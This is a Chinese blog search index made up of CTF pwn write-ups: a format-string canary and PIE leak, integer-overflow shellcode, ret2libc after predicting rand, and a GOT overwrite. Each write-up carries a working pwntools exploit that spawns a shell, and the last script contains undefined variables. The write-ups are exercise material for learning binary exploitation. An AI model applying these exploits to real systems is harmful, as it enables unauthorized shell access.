<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2024.2.9</title>
      <link href="/2024/02/21/2024.2.9/"/>
      <url>/2024/02/21/2024.2.9/</url>
      
        <content type="html"><![CDATA[<h1 id="ff"><a href="#ff" class="headerlink" title="ff"></a>ff</h1><p>开了pie和canary的一道题，还有格式化字符串漏洞，用格式化字符串找到canary，然后利用当前程序的地址算出基址破解pie</p><p>先计算字符串的偏移，一般canary的后两位是00，算出canary的偏移在17,下一个程序在后两个，第19</p><p><img src="/2024/02/21/2024.2/test%5Cff.1.png"></p><p>因为要计算基址，先找到第19位程序的后四位地址再计算</p><p><img src="/2024/02/21/2024.2/test%5Cff.2.png"></p><p>然后找到后门函数位置</p><p><img src="/2024/02/21/2024.2/test%5Cff.3.png"></p><p>找到canary的偏移</p><p><img src="/2024/02/21/2024.2/test%5Cff.4.png"></p><p>exp:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(os="linux", arch="amd64", log_level="debug")</span><br><span class="line"></span><br><span class="line">p = process("./ff")</span><br><span class="line"></span><br><span class="line">p.sendline(b"%17$p-%19$p")</span><br><span class="line"></span><br><span class="line">p.recvuntil("0x")</span><br><span class="line"></span><br><span class="line">canary = int(p.recv(16),16)</span><br><span class="line"></span><br><span class="line">ret = int(p.recv(15)[3:],16)</span><br><span class="line"></span><br><span class="line">base = ret - 0x146F</span><br><span class="line"></span><br><span class="line">cat = base + 0x1231</span><br><span class="line"></span><br><span class="line">payload = b'a' * 56 + p64(canary) + p64(0) + p64(cat)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="/2024/02/21/2024.2/test%5Cff.5.png"></p><p>(因为没自己写flag所以cat不到)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Week 2</title>
      <link href="/2024/02/06/week%202/"/>
      <url>/2024/02/06/week%202/</url>
      
        <content type="html"><![CDATA[<h1 id="HGAME-PWN"><a href="#HGAME-PWN" class="headerlink" title="HGAME PWN"></a>HGAME PWN</h1><h2 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h2><p>存在整数溢出，unsigned v4,输入-1，然后给一个shellcode</p><p>找一个shellcode放里面</p><p>shellcode来源：<a href="https://blog.csdn.net/mcmuyanga/article/details/114828207">https://blog.csdn.net/mcmuyanga/article/details/114828207</a></p><p>exp:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line"></span><br><span class="line">context(log_level='debug',arch='amd64',os='linux')</span><br><span class="line">p=process('./ezshellcode')</span><br><span class="line"></span><br><span class="line">p.sendlineafter("of your shellcode:",b'-1')</span><br><span class="line"></span><br><span class="line">shellcode=b"Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H</span><br><span class="line">0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1</span><br><span class="line">n0J0h0a070t"</span><br><span class="line"></span><br><span class="line">p.sendafter("input your shellcode:",shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><h2 id="Elden-Random-Challenge"><a href="#Elden-Random-Challenge" class="headerlink" title="Elden Random Challenge"></a>Elden Random Challenge</h2><p>猜中99个随机数之后有个read的栈溢出，然后就是基础的ret2libc</p><p>使用ctypes调用链接库的函数，通过创建cdll.LoadLibary来找出随机数</p><p>进入myread函数之后通过read函数与动态链接库，写一个ret2libc</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line"></span><br><span class="line">context(log_level='debug',os='linux',arch='amd64',terminal=['tmux','splitw','-h'])</span><br><span class="line"></span><br><span class="line">p = remote('106.14.57.14',30931)</span><br><span class="line"></span><br><span class="line">elf = ELF('./vuln')</span><br><span class="line">libc = cdll.LoadLibrary('./libc.so.6')</span><br><span class="line"></span><br><span class="line">libc.srand(0)  #找种子</span><br><span class="line"></span><br><span class="line">p.sendafter("thy name", b'a' * 0x12)</span><br><span class="line"></span><br><span class="line">for i in range(0,99):</span><br><span class="line">    m = libc.rand()%100+1</span><br><span class="line">    # print(m)</span><br><span class="line">    p.sendafter("guess the number:",p64(m)) </span><br><span class="line">    </span><br><span class="line">libc = ELF('./libc.so.6')</span><br><span class="line">puts_got = elf.got['puts']</span><br><span class="line">puts_plt = elf.plt['puts']</span><br><span class="line"></span><br><span class="line">pop_rdi = 0x401423</span><br><span class="line">ret = 0x40101A</span><br><span class="line"></span><br><span class="line">read = 0x401250 </span><br><span class="line"></span><br><span class="line">payload=b'a'*0x38</span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(puts_plt)</span><br><span class="line">payload+=p64(read)</span><br><span class="line"></span><br><span class="line">p.sendafter("thy brilliant mind.",payload)</span><br><span class="line"></span><br><span class="line">libc_base=u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))-libc.sym['puts']</span><br><span class="line">                 </span><br><span class="line"># print("libc_base=",hex(libc_base))</span><br><span class="line"></span><br><span class="line">payload=b'a'*0x38</span><br><span class="line">payload+=p64(ret)</span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(libc_base+next(libc.search(b'/bin/sh')))</span><br><span class="line">payload+=p64(libc_base+libc.sym['system'])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><h1 id="CISCN-2019西南-PWN1"><a href="#CISCN-2019西南-PWN1" class="headerlink" title="[CISCN 2019西南]PWN1"></a>[CISCN 2019西南]PWN1</h1><p>hgame的fmt没打通，就又找了一道格式化字符串的题</p><p>先gdb动调计算出偏移量4，找libc中的printf的got表，system的plt，加上个主函数</p><p>修改fini，重新走一遍程序，使用fmtstr把system换上去</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(log_level='debug',arch='i386', os='linux')</span><br><span class="line"></span><br><span class="line">p = process('./pwn')</span><br><span class="line">elf = ELF(pwn)</span><br><span class="line">#rop = ROP(pwn)</span><br><span class="line"></span><br><span class="line">libc =elf.libc</span><br><span class="line"></span><br><span class="line">io.recvuntil(b"your name?\n")</span><br><span class="line"></span><br><span class="line">fini = 0x0804979C  </span><br><span class="line">system_addr = elf.plt['system']</span><br><span class="line">printf_addr = elf.got['printf']</span><br><span class="line">main = elf.symbols['main']</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(4, {fini :main , printf_addr:system_addr},write_size='short')#write_size有int short 跟byte</span><br><span class="line">print(payload)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(b"What's your name?\n")</span><br><span class="line"></span><br><span class="line">io.sendline(b'/bin/sh\x00')</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
